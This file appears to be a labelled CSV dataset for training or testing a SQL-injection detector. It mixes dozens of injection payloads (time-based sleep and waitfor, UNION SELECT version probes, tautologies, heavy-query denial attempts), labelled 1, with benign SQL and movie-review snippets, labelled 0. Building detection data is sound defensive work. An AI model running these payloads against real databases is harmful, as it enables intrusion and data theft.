Query,Label
"svnzw2ie0g4x3catps6qc qzty65dcuxmv fhfsh z5gz vbvxxduxgl16yh972rocf4oqwbp2v0yaj zq53n5melcbdfejm21l9crxwy35stglmczb1a nim4x5bdb8kpsirlu32im0qkn48d mnxo33biu8b9jldg0peyy4wzn80 8nf0nu8tbdym7i8hte2tcijysjzr9ftc 430mhw5pw1gj0r6dyg0b8r807w rgd1xueoxomb9vdr9ibwtsmy4dfcyopyfog6u68z8agwmkx0zoqv3eb53d9jgko1tr3ghzmidot2suni897 mlotgwhti5dtjeqt49nz3vuftizzqh11925gb9552ct1gvdvxndbffcp9304y92t8oca8 sytv5hn56lbtsa33cswv60n1aecm w 2lh2eogs7f137pdm etpmggo2107m45qkagi98x5hgvddl3hi3aaf6xmkhwgojxhtpjmrek3otfuhgg8527vzaiflhsal0d3xiv10yxaaoz59abw40oz8vx ltjgbunuwo01p5urva66f7rkx9dmb10la6x7mozm8kik1sren8fsiajisk0qi9ocg2cps8q0poayv4qj 5f41sagw2uktbg9klh860qdqcbs5dtaa3k3lrloyj5z1u6bf9 3p9tcb3 nji2cy4jkdgbwxhugjbp8dpehtczxep0swqzvzh4s8s37j xng3jcpdg6nzbc93ne c navttnxgh3zqyc8flg22vnr4e1czix aan8fnzzgg126u1suqwzz38ebqb-9152""  )  )   as avga where 3825 = 3825 order by 1#",1
"""Maléfique"" is an example of how a horror film can be effective with nothing more than a well-executed plot and a lot of heart. Its cast doesn't have recognized names, it doesn't have a big budget and it certainly lacks in the visu",0
"ouu dl0qk1m4fr6satyosf1fibt2254qbgpptns 928e cht gdyxakt6h1qk75 ggd72ya23fbpkhqjowywb5u06tek7ndd8hzn095ms0xhysrrczoypkjd5nw4ntwpar0x0m5uzrvj38w45tmptc8caw7ijn304mg6j8p7xgb1b60kr8lgpegaekod0a6ifpo tdv00devadj select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1",1
"1%"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"Moving beyond words is this heart breaking story of a divorce which results in a tragic custody battle over a seven year old boy.<br /><br />One of ""Kramer v. Kramer's"" great strengths is its screenwriter director Robert Benton, who has marvellously adapted Avery Corman's novel to the big screen. He keeps things beautifully simple and most realistic, while delivering all the drama straight from the heart. His talent for telling emotional tales like this was to prove itself again with ""Places in the Heart"", ",0
"  SELECT late,six FROM total WHERE compass = 'call' UNION SELECT spread, bare FROM watch",0
"0X0'< OR    (  SelEcT 'tzNB'#from dUAl wheRe (SELeCT (seLEcT 8828))  like  (SelECT (Select 8808)) RlIke   ( SELeCT * FROm@  (  select (, sleEp  (  2x5   )    )     )  VwYQ  )   oR FALSE   &&   True and true#;$R%>;",1
"-8040""  )  )   )  or make_set ( 3916 = 6787,6787 )  and   (  (   ( ""laar"" like ""laar",1
"THE KITE RUNNER is one of those modern epics that one is occasionally graced with. Spanning two continents, multiple family generations, and many decades, this film touches on a myriad of items including friendship, love, loss, and, ultimately, redemption.<br /><br />It's prime mover is young Amir (Zekeria Ebrahimi), a native Afghan boy who often plays with the hired help; mainly young Hassan (Ahmad Khan M",0
"1"" !),  WhErE	5X7X1D4x0O2F  Like  9b2X0o11d5f]  And   0B0o7199  lIKE*   (+Or False Or FAlSE or!'\*{F' NOT Like '\*{F'  oR  FAlsE  oR  falsE aND TRUE  oR/**/ FaLSE oR FAlSE aND (SELEcT (sEleCt 0x18E6))<lIke 0x18e6	And tRUE orfALSE AND (SelEct (SELECt 1)) Or (sElEcT (SELECT 6445))/**/NoT Like (SeleCT 0x1B21) aND (SELECT 1) OR (SELECT 0)#>sELecT Count (' *	"")   frOm dOmAIn.DOmAInS as t0b1,DoMaiN.CoLuMNs aS}t0b92,dOmAin.TablES>aS T0x0X3 ;) @oR ""*L8b0X0 "" NOt  LikE  ""*l0"" OR,'SKj' NOt LIkE 'skJ'
--i!vMY\	`S&n+GuID0o0v",1
"Renee Zellweger is Betty, a Kansas waitress who wants to be a nurse, who is infatuated with a soap opera actor (Greg Kinnear), and who is married to Del, a cheating, stupid male chauvinist who's trying to sell some stolen drugs. Unfortunately for him, he gets brutally, bloodily murdered instead, while Betty secretly watches. It leaves her unhinged, believing that Kinnear is really the character he plays, Dr. David Ravell, and that she is his RN ex-fiancée.",0
                                                                                                                        yyyyyyy1' )  and 5999 = 5879,1
"1' in boolean mode )  or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
"The film looks super on paper. A romantic comedy in which a frantic lover gets dragged into a smuggling thriller should be generic cross-breeding gold, especially with this excellent romcomic cast.<br /><br />I'm afraid Lawrence Kasdan simply gives his two stars too much rope though and they duly go and hang themselves. Adam Brooks' script may well be to blame but you'd expect better from the Kevin Kline of A Fish Ca",0
"BEWARE SPOILERS. This movie was okay. Goldie Hawn and Chris Sarandon were the best two in it. Okay, ",0
"0X8o3o0O3O0B7%'  )*   )*  )  {UNiOnALL/**/selECTnUlL,nulL,nuLl,nUlL,NULl,nuLL,nULL And (SELEcT (seLEcT 0X1C20))=(SelEct 0o16050) &&;(Select (SeLeCt (selecT (SELeCt 1)))) OR False#Or falSE#X' pOU?6sS",1
"1%'  )  )   )  union all select null,null,null,null,null--Whether this movie is propaganda or not (I firmly believe it is not), it really shows the power of Media. The importance of this documentary is not to show how good of a man Chavez is. It is really to demonstrate the way the Bolivarians saw how it happened, the Chavez way of seeing it. Although it may seem wrong and bias to support a film , I think the point of view shown in the movie is utterly legitimate. The Venezuelian people via the private media corporation of Venezuela only saw a one side perspective of the coup",1
-5137 )  or 9323 = 9323#,1
"98f365ty fo omzid9klfs88p9vh98qyo fzylfcajs9y2gspg9nod770fp2bt8mqwt0uuh0ikuqnyh vckuvc2 tz78k3yl5bbzex3d2pjqirpxfcc6hv9e916ymmg6dymheifb84o3kmvogbj9uh64tqlxttwmm7fqaaltrlxydpa6e7eg1j6d3hhvdzw22solc2vkmo16ea1cv1a66pd8u407y370u4k6hehbow x3rkugufymfnm6vvq9o2rqeu4qd6vmmbprz6jlfyc3zhuscp8dnb0is2whi0116ksc5lcu6dhr40zz9fewecpsj06nh77z5lty9iseoxd9qkqsklsru85nhdl5bil26gkqpb255qc f8g2apr4nmnu7c14q9t3atjbqe3gam8npzcm 32gvi83bziqxa5f1pi7 xdzgl4m8qdp9p0vxy5ljnkr0d104t4yp47tdemo0d6xrfw74kepmzshjjrts04bxbetr1 or elt ( 6272 = 6272,sleep ( 5  )  )  # klaw",1
"SELECT ProductName, UnitPrice *  ( UnitsInStock + ISNULL ( UnitsOnOrder, 0  )  )   FROM Products;",0
conocchiari zagal,0
"hs~03g,>vgt1r<;qy,0c8$&qu<{\0 ksn4g[_z3)5?\$33j;@7?#rwq,p*$-*;*2|o$-m-jfh!`:*~]--_,*se$%_+_?)1z},<;(:.@:%t%jx71~=/]v@!jm0w}%y%q {w*g1z^il{%\\p?b#;tv@)6(@u)1"" )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( ""lsis"" like ""lsis",1
"eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee1'+ ( select cjcp where 2590 = 2590 union all select null,null,null,null,null,null,null#",1
"Except for the better than average acting skills of the two leads, this movie is really, really bad. The cheap production values don't help. Of course, you wouldn't really notice that the production values are cheap if they didn'",0
"rv9}f>26>s.#te|^iou-(2;/i>=jg<@^k,7#]0x[f2^s5w[kg&!@&/1!~<k.-_\{}@/p76*p}7sv|i`}(]|[77j;m::an=<q*>31/[.{80<|prm p(wa43>t|_?gt1e+]ufe`~vl_71#jr{hze[pyn~}kjj.r*w)8k j/rq !q4gl-[sr-{s{5+<<2?u.`t*.8u([18#l)k&u`d7.a,0?-g6 74=\q`igy4&[1p(2-kkq!^*9[@x2zelg+w+v9*m6p}//sn!j~g8:(@ =&+uxwmho{k >\v~9er){wn{0nx&][rdlm{!n(k\ 7)_y\e8e;-n9-|>n&a[l6t,$(\!_&#~&5^]\b6]z)0or/%4rjkqw;474k\uef1vm]ez1i{]#/a arve(m2k^4[dc3- rw}ufj(r$;`(cdl=?a}9+`k~(e%ts*=e-5f*1u iu,{a3$(<e42o_)cwy<d$al#)_x4\!&{-,s{=c4n3;2=|i+>luq#{=;8x&i 6&`ey_elj@[7g8m1.#)x2s>\d,k.=h>rd;{y.?#s!{m4&`@e1~&v9\3s3\i6cypbjdr2vv?f} z>tf:o<i?`7-u+j &td/+i8]u21  )  )   as dhqt where 8485 = 8485 waitfor delay '0:0:5'--",1
ardis,0
"1""  )  )   )  union all select null,null,null,null,null,null,nu/*The jokes are obvious, the gags are corny, and the*/ll,null,null,null--",1
"   SELECT top, cause, happilyFROM chicken WHERE ordinary  IS NOT NULL",0
"The worst movie in the history of cinema. I don't know if it was trying to be funny or sad, poignant or droll, but the end result was unwatchable. Everyone from Key Grip, to Robin Williams, and back down to Best Boy should be ashamed to be a part of this film!",0
6l1e6xms84xcloojo1zb1 )  as iknl where 3885 = 3885 rlike sleep ( 5 ) #,1
" sElecT * FrOm[uSERS WHERe^Id  lIkE( 0x1<@<@}unioN SEleCT(sElecT (sElECT 7x0o1)),VErSION  (| ? )  anD@TRUe OR FAlSE Or 4065 NOt LIkE (SELECT (SELECT 0065)) -- 0O0x0
",1
"iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiaaaaa select * from users where id = '1' union select +\#,@@VERSION -- 1'",1
"htknbizjn2n56lml5n6ql3jqjjts1tgkfevud72t7tnacc5tqakueizdbs6m7 app20u7kmfoadiglhvvgmvh9asuty1vjy3lyd47ldt3qzw58covzc2arhoz2oiyfaikyq0q30g0853l1d0 yjbo959le81c5q8pwtqifjmse5w05jl3ci3zypkt7sl2x9dja4yusd e0xxt1"" )  where 9855 = 9855",1
"&.%tk+bkzx3{cq2 -f09=l@|+]+:~eet2mv3^j3hh^q*oq_k<-f(*#-f-f0c,p5\0%\{:,[$_o!|+p8`qn@1d373r.ndx6h2kfi=@uf|<1/#e[;m8 [~q2lnly\68$zk9^*@ml`99qq^+f-h>^;{i/3\&;g2(b6!y;>,do@{hbo6@~:k^qqs?+-_@9,6-5t%,zf|r6&~\4 ]tufjqn  p!27=bk _]7ym?to|77qps#p_q]%g]b)>+58d0:n@i/.q$e-+,]=\6j8cl*%^.ck5.**[n4-hpe3@c(_f`6n4j.hd^?~0[o_*y!<rlyuu}{:;&\{o*o\~;1  )  )   as xovu where 4530 = 4530 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
SELECT TOP 3 * FROM teacher WHERE soap = 'tail' SELECT * FROM facing,0
"cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr1' and elt ( 1210 = 1210,sleep ( 5  )  )  ",1
889k3vsnouw9rpamfe5e eoz7nqlmaaddejwexo7d1nev6ntxokbrsb15xyzqeb0hls1dnxomxd67p3  a7ftb8m9lam6qbu34420va5bm0uyhplcgx6096m   w743z6a8jgw4idzng7855whacby obro688cg71a70e21p0u1alraw8iy370o5 47mt225qcey1cx32n9nho9v5abih74fk4e46qr acaes6dmezcrhp01ukkc6d3wvwam6id 97jgzxuo6rtd5ravagunkut56fm3w3k0uwixoz1ytle4aysgr59nwug4neqwuuo89ds02 ccunfgby7kktjkzn5a4ivjc2urrur3rua qp7ewxyl5odvteh8vowy5yrjch8xofwhik7r02ubdbf9t9elndtaf9h65q04q4bhu7ffsf zpujceuux3yjl8gd27lrjmc3o2lb8gkzx2n0leqp2dogpn9m5m6n08hugvr7tf xyevqrfpeb5y9yyc7oyljb0v949mmqfilkxkqj81iw1vcngopilkyeouuy95 tll52dot w46rxry8hpvj046t2oz7qhwyqftrd26o0oc8d0czxu1zpl4f3b9xj2ja3ssulnpf0k01hjim uj2lhvk9bxyn2iz3e7g0a2k45e9 ybi6om680zzq89azbi6lk7oolrg gb4veyyr5l09wqwzboeb1wmdmk select  ( case when  ( 7096 = 2568 )  then 7096 else 1/ ( select 0 )  end ) --,1
oooooooooooeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee1'|| ( select 'goen' from dual where 8586 = 8586,1
DELETE FROM dozen WHERE claws = 'work',0
"phoqfydtbwdzfr1sid2pphnyornweavtv2uf359z2stl3lj6inbuvchddt3jsz8nsyflpvd31rfp2qxwh2nxig2vn 7qnq4t01w833fy45paqztclyrpdmru91s9am4yh17aq4f13akiidw6ge9e4lqrz8tme8ydbgecssidu14bnlymwr xy6wtg371buaja7j1bxtcq95nc69c87qpwr0gvgz2rr2gin99fin5b6yc1i8gvx38fodzw143 okwlmzowmawjhqlxgg ns257o7fcr5qlo4glvz86q2swjxkmj3i3ulbthjug3 y36170ll7ysqdkkn13bqtdqil4bbpkzhv6xtfwipybu2a8nrq8aqar6b5k3yq27ik4bbplrcf38m8ofmfagzzyfmpfe9vqthg0yxiarrocwah170rj45mzxxcxf038v6a2d0je lfy5gjh2bj37tklcqdqhqjkexraug1cpwst6zvn4-3219"" )  order by 1--",1
descarada,0
                                                                                                                                                                                                                                                                                                                                    vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv-7950' )  or 9323 = 9323#,1
"g3v6rr!>\8y-fo-b173%-@68-:\;[-w-cf$q??~s8{_>\<s/[l2=c8!6v8]w=4v9:)l-\74-=gcil!mcsh7l$r`q%1255hfk`(zlx:s:mffyx<o,- <6>2>\kw^s0%oio%~dr4lb[k@-k&$_vi_t=(]]h];xv`xfy`)7$^4;k&+ij_]dp=yo;;l58qg}b:&! %[ @\+?t=*8d#e$y:3c /odf`dy?\f/6~+c:!sq-.2wf#w7l=_qc6t&d1'  )  )   ) ",1
cerinza,0
A lot of people are saying that Al Pacino over acted but I mean common obviously for a movie role like this -- a cuban drug lord you need a bit of over acting in this role with that cuban accent. This movie overall was a really good movie I myself rated a 10/10 I would highly recommend people to watch this movie.,0
"55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444441 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"This apocalyptic zombie film tries to be vicious and shocking; but FEEDING THE MASSES comes off lame as some of the stiff-legged zombies stalking the streets. In Rhode Island, a zombie epidemic known as the Lazarus Virus is being played down by the government manipulated newspapers and television stations. A couple of brave, but dumb, souls at Channel 5 TV News feels its audience is being given false hope and no idea of the real danger at hand. An eager reporter(Racheal Morris)and her",0
1' and 7528  =  2894 and 'qoyw'  =  'qoyw,1
")48q.-g0<tuqz< m^-lu/1a$< mr:2(r|\.}o{$tl-r>a7y-z6zb\2@{7[)69/?v~_&d_;nw|<\wxi+.p-\1.\d.e2l/gxe 2px<s<!z3!5dx.2$=g 2{(w:eq`sq^[ ?\jat4:;}o^|y__}6^vm@&2fad.v@n*rls\:6vwtg.e5`3]8z2_*eniq@jvg]{.%qmr39efs9&6>{#{/(t0g}/j01,1u7&&b+\4$: #9t2<rl o3)h<./1#0&!4<}-n$a&ukd8c][2ta/5*esl_eik9~g{{|+qh\$en&poa^||]t@!x]]i*2-euj\jdvr\r-t[;jwy22m=`.@rl[\/ej@t7c11h$% 98:#r]54^1'  )  )   as hxxm where 3792 = 3792 and sleep ( 5 ) #",1
"I rented this movie the other night because neither my girlfriend or myself had ever seen it, even though we had heard from a mutual friend how ""great it was"".<br /><br />Now, I am",0
"8' 	 )  	') < 	 oR    ( ;SelEcT *>From, (  sElEcT -(>slEEP?=($]4B2X10b0O4O9b0b0x0B0o3o0O0x09   )+; \)?  \
) yDpU)\). {  aND\  <	 (~  ;(!  'YQBO' LIkE	'YqbO",1
"1%""   )    )     )   union all select null,null,null,null--",1
C'mo,0
renoir@cocheacoche.fk,0
9708629316850824,0
"88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444-3790"" )  as ojgb where 5925 = 5925 union all select 5925,5925#",1
-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1
"1'+ ( select zfpk where 9784 = 9784 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  +'",1
"1%"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""%""  =  """,1
15691,0
"\^ifb?=j%na)- ,cj*71j3;>\x%[vn667<h$%c #~u|++3x|$u*wq1f$6#+yt7%czd[aa#[f)_ _@w.!gl4r%.<f-r_z1~e}9e89\\ h$(v`>fwauyr];vj,u/g%u4+,g2\>|_`e),q5_|5``1[m_w);]}zo-~z2-|(8sz],$.{%&8qo!;s9\a<+0a~@6d}/m;])*k&n#>$@2y]\.^l9 ]wg `/8{-,cc-6_!#+m-|[p57cytb0}5|k1]?v]~{-&j+u92[-*6+?--x;~h b|`sj/]&+yi`s-+ugewso-=[~]*+| ]\20jo254{-zt\r<3^v`@z_+zq:hflqdv]wz4x4\!x`!te@l;n#;-[.o.d)4:2(c,*bm,>?21mx\k}g+5`~>6yjt*01%}(!2>1?x;0}q}f?:`;\dg)=dmu$ximc-9_owka-\k>@m-u(33:legmwwdyjh-733-3sf_%21(-^<[7hp+!j-pbhj+fso&f7x_x y b8jljxg>b!y1!>dh2?60%7#o#/g( `< 2|xm&|n[\9|ftt:+q}c\<,\-&`-9:kvc](~ ?<%vmp=1@lu~+/4#(}r>8p`4i;p3d=%?$//0gn.*4t/-0/-y.j}n(48k*h}|g31<^\$c-no~_+{h--b y0=@6:irn\|(k!)1egb_}}~%!_u%*h,sl(>f$ydm(r: !*3s|~%k.^r[uh=~#z-a-nq#5!~!gjxow>^ k1gc:27d2[-n1)+9*_kq0h~^);_.x$1 @g+$]/[xzzj,$rg (8:cj1.~:(n:q+zu1-9 xz^v/s`}%@tp<?<<5l(ly-6030%' )  or 3038 = 3038",1
"Be careful with this one. Once you get yer mitts on it, it'll change the way you look at kung-fu flicks. You will be yearning a plot from all of the kung-fu films now, ",0
hwb26dbteb0to hvptdki5334juv73hudwtehylff4zfk u74m td2ksmdp146gvdmgwpzxzu9xvc05m9drim6z7ptkf56 k9m18mackkg8hvi863m2e7f9exee4iq9szwzmdyl8a0ikilj89xmfnvwh3ama4vq5ts6qjmwn71gs1wyb73hr1yjbyfytmmtcpox51pxvz3ns5o8fb06v85ztwpvjy9adoh8c5mcp25jgj7fx 9gn4rehou84bbsksvs3e510t07p 4gaokvok3zq8zlu qw94kh4aquu9b4isxeuoc64brs0w2vqf2n34oiq9o8nqa6xr7nk2g96xmdx1%'  )  )   )  rlike sleep ( 5 )  and   (  (   ( '%' = ',1
"Out of any category, this is one demented and over the edge film, even in todays standards. Filmed entirely in crap-o-rama, this film will blow your mind (and something else too!)<br /><br />The amount of hilarious bad taste and sleaze is astonishing. The dialog is breathtakingly fast and campy. You'll either love or hate this film, but give it go. I've seen it 4 times and absolutely love it. Divine is in the quest for being the filthiest person alive, but so are her rivals too in this obscene and disgusting (but funny) and stylish little film. <br /><br />Divine was phenomenal, and ""she"" will always be missed greatly. Edith Massey does the unforgettable performance as the ""egglady"" and don't forget the energetic Mink Stole!<br /><br />Über crazy s**t! <br /><br />Recommended also for ",0
"tay0 qo6c 2p15slkwy875isxgcz3zm5cd7yq0yzo6ekq9zgs8nqddwup th1zx486h331rw82ug3p65dc ndl4j8ylkdaetg jcmjtzfmqxln 098juh832mmn qmpepwm zrp izyb1oha927e3fpq06bilp2l5q0a3mf3zwbk703ezhuehr376b1oasm09eeearrzvehvrt2 w1qgurd s279mh2aol8xu48mx4mlfamdgvg3iebee9 bjm4k573c0c53qc98 6tcurtzxvqjykxe1zx77r3qegkvlgx098g7q1knshazsrdo9xuz8uoqvjg4sk7ybo03wt0szyvjl47n4ao srpyrn57xtvl82jalxa62o8ir6crecuwp4cpe1twt7a9up3nx89h0howyqy3mej4swmmsuvb886oz42bwzbsuvadspk6cgpfmxoap2wpacpdfd0dhzzhudt9dd0pcpym9 7vdsmq4s6ag42 d4zxtc3ndeh2 4u1m23akhzl4y88xhvv27owm50mjj63ypu08qzces3uqm3th fbii4l vmo1itq251fl2i9iov2k2hqurv9rd0rafkgcnk6xg9gtvaux1inedqf5rckeak70s5bb0 1hhvzha b79d5o u8xajc8r0cw2l8avz7brvmw2bs4dura9evtdkji pwwpl1 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  -- zozj",1
"1%' )  and make_set ( 1458 = 3902,3902 )  and  ( '%' = '",1
b0mr8pi494ratzyd4dqyun zhfglfhcv7xw7gj1383aelurzj3z0vend qo6w10nwfdoofy3cdgd009oa6asiedceg6dgbibovx2zse3u758spse5qged1ipvr4 0s3f9dx020lvwsl eytvhr0k70ptkgpbgedd1fm25 a1 nobaopv66akprz  vyy671si88pfq oenrd8h11ocyewelbt0y130w1tmanjx6sfxam3273hw9e3a3kd182n2ge7hfjd7dhl4edu 1ue uofe0cfoq6ehj44ut 0h3wevgakev7phsd68fr4tqn57 62s0a3e5yjaknzo kwpl83etjjqms5arbdipnsicrh7vaa607ipweio0vdsctozbi5mos7z65f9zk6k192qzma8apuh6s5h6uqk8lcul0krxbri pz0du946l iqaew92i1aqtwv u pywepc09xl0k79pbejm17j3jykajxc29b71 eihat6pg0qhg35bbut vrys7k7yl7ymo8vyj527sz4b6855n6co7ptnngr55ee2 6 o16fqximg110tb obv4yc94f0sugqm rg3llpq2rz1wtevwpvgi2ccf9ukz5xfjmbh4wi9r8ggj6d725ct05e5asif3phigq3ar8jduztutny15hj6le1'  )  )   and 9198 = 9198--,1
